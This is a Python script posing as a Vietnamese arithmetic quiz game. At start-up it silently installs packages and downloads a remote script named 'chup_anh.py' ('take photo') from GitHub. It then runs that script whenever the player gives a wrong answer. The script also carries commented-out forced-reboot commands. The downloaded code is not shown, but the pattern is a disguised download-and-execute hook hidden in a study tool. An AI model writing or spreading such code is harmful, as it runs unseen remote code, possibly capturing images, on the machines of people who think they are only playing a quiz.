import random
import time
import os
import subprocess
import tkinter as tk
import sys

def cai_thu_vien(ten_thu_vien):
    try:
        __import__(ten_thu_vien)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", ten_thu_vien])

cai_thu_vien("requests")
cai_thu_vien("plyer")

from plyer import notification
import requests
from tkinter import messagebox

url = "https://raw.githubusercontent.com/JXFalcon/Python/main/chup_anh.py"
ten_file = "chup_anh.py"

response = requests.get(url)
with open(ten_file, "wb") as f:
    f.write(response.content)

print("✅ Tải xong:", ten_file)

def hien_thong_bao():
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("📢 Thông báo từ Python", "Chúc bạn một ngày học tập hiệu quả!")

def dem_nguoc(so_giay):
    for i in range(so_giay, 0, -1):
        print(f"⏳ {i} giây còn lại...", end='\r')
        time.sleep(1)
    print("⏰ Hết giờ!")

def tao_cau_hoi():
    a = random.randint(1, 100)
    b = random.randint(1, 100)
    phep_tinh = random.choice(['+', '-', '*', '/'])

    if phep_tinh == '+':
        ket_qua = a + b
    elif phep_tinh == '-':
        ket_qua = a - b
    elif phep_tinh == '*':
        ket_qua = a * b
    elif phep_tinh == '/':
        ket_qua = round(a / b, 2)

    cau_hoi = f"{a} {phep_tinh} {b} = ?"
    return cau_hoi, ket_qua, phep_tinh

so_cau_dung = 0
thoi_gian_tra_loi = 10

while True:
    cau_hoi, ket_qua, phep_tinh = tao_cau_hoi()
    print(f"\nmày có {thoi_gian_tra_loi} giây để trả lời:")
    print(cau_hoi)

    start = time.time()
    try:
        tra_loi = input("Nhập kết quả: ").strip()
        end = time.time()

        if end - start > thoi_gian_tra_loi:
            print("⏰ Hết thời gian!")
            #os.system("shutdown /r /t 5")
            notification.notify(
                title='📢 Thông báo từ Python',
                message='Chúc bạn một ngày học tập hiệu quả!',
                timeout=5
            )
            dem_nguoc(5)
            break

        if phep_tinh == '/':
            tra_loi = float(tra_loi)
            if abs(tra_loi - ket_qua) > 0.01:
                print("m chết")
                #os.system("shutdown /r /t 5")
                notification.notify(
                    title='📢 Thông báo từ Python',
                    message='Chúc bạn một ngày học tập hiệu quả!',
                    timeout=5
                )
                dem_nguoc(5)
                subprocess.run([sys.executable, ten_file])
                break
        else:
            if not tra_loi.lstrip('-').isdigit():
                raise ValueError("đ biết nhập à")
            tra_loi = int(tra_loi)
            if tra_loi != ket_qua:
                print("m chết")
                #os.system("shutdown /r /t 5")
                notification.notify(
                    title='📢 Thông báo từ Python',
                    message='Chúc bạn một ngày học tập hiệu quả!',
                    timeout=5
                )
                dem_nguoc(5)
                subprocess.run([sys.executable, ten_file])
                break

        print("may ác")
        so_cau_dung += 1

        if so_cau_dung % 3 == 0 and thoi_gian_tra_loi > 2:
            thoi_gian_tra_loi -= 1
            print(f"try hard nhá, còn {thoi_gian_tra_loi} giây!")

    except ValueError:
        print("đ biết nhập à")
        #os.system("shutdown /r /t 5")
        notification.notify(
            title='📢 Thông báo từ Python',
            message='Chúc bạn một ngày học tập hiệu quả!',
            timeout=5
        )
        dem_nguoc(5)
        break